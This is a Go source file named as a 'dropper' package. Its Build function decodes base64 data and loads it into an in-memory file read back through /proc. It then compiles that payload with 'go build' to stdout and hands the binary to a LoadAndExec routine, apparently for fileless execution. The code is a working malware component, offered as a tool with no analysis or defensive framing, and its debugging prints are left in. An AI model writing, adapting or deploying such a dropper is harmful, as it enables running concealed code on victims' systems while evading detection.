package dropper

import (
	"bytes"
	"encoding/base64"
	"fmt"
	"io/ioutil"
	"os"
	"os/exec"
)

const (
	TMPFILENAME = "tmp/f.go"
)

// Build takes b64 data and runs it
func Build(data string) error {

	// convert from  b64 to raw
	rawDecodedText, err := base64.StdEncoding.DecodeString(data)
	if err != nil {
		fmt.Print(err)
	}

	// first get fd from dropper
	fd, err := Load(rawDecodedText)
	if err != nil {
		return err
	}
	fmt.Printf("[*] Loaded the file into /proc \n")

	pid := os.Getpid()

	// second read data from memory
	filepath := fmt.Sprintf("/proc/%d/fd/%d", pid, fd)

	file2read, err := os.Open(filepath)
	if err != nil {
		return err
	}
	fmt.Printf("[*] Opened the file from /proc \n")

	defer file2read.Close()

	// TODO buffer this so that the size is not massive
	b, err := ioutil.ReadAll(file2read)
	if err != nil {
		return err
	}
	fmt.Printf("[*] Read the file from /proc \n")

	// third memory to temp file (because GO cannot handle weird paths :( )
	f, err := os.Create(TMPFILENAME)
	if err != nil {
		return err
	}
	fmt.Printf("[*] Created the temporary file \n")

	_, err = f.Write(b)
	if err != nil {
		return err
	}
	fmt.Printf("[*] Wrote to the temporary file \n")

	f.Sync()
	defer f.Close()
	// defer os.Remove(TMPFILENAME)

	// fmt.Print(b)
	// fmt.Printf("%s\n---\n", b)

	// fmt.Println(os.Getwd())

	// command2run := fmt.Sprintf("go build  %s", TMPFILENAME)
	// command2run := fmt.Sprintf("/usr/bin/go -v ;echo build  %s", TMPFILENAME)
	// command2run := ("echo -v")

	// cmd := exec.Command("go", "build", "-o", "/dev/tty", TMPFILENAME, os.Getenv("PATH"))
	// fmt.Printf("FILENAME %s\n", TMPFILENAME)

	cmd := exec.Command("go", "build", "-o", "/proc/self/fd/1", TMPFILENAME)
	fmt.Printf("CMD %s\n", cmd.String())

	var out bytes.Buffer
	var errBuff bytes.Buffer
	cmd.Stdout = &out
	cmd.Stderr = &errBuff

	err = cmd.Run()
	if err != nil {
		return err
	}
	// fmt.Printf("[*] Ran command to /dev/tty \n")

	fmt.Printf("STDOUT => %x\n", out.String())
	fmt.Printf("STDERR => %x", errBuff.String())
	// fmt.Printf("%x", (out.Bytes()))
	// fmt.Printf("%x", (err.Bytes()))

	fmt.Printf("[*] Ran command to /proc/self/fd/1 \n")
	fmt.Println("-------------------------------------")

	err = LoadAndExec(out.Bytes())
	if err != nil {
		return err
	}

	return nil
}
